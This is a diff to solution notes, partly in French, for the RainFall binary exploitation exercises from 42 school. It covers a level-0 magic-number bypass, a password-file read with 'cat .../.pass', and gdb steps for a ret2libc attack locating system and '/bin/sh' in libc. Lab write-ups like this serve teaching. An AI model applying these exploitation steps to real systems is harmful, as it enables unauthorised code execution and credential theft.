@@ -3,6 +3,11 @@ RainFall project from 42
 
 # Flag 0
 
+On voit que la comparaison verifie si iVar1 est 0x1a7, si c'est le cas on a acces au flag suivant.
+Donc on a qu'a regarder combien vaut 0x1a7 en decimal, et ca vaut 423.
+
+On execute donc le programme avec 423.
+
 if (iVar1 == 0x1a7)
 
 0x1a7 = 423
@@ -50,6 +55,7 @@ cat /home/user/level2/.pass
 
 # flag 02
 
+// plus d'explications necessaire
 ret2libc to bypass the return address overwrite protection
 
 gdb
@@ -57,7 +63,7 @@ b main
 r
 p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-info proc -> adresse libc = 0xb7e2c000
+info proc map -> adresse libc = 0xb7e2c000
 find 0xb7e2c000, +99999999, "/bin/sh" -> trouve la string /bin/sh dans la libc pour l'utiliser avec system
 0xb7f8cc58
 warning: Unable to access target memory at 0xb7fd3160, halting search.
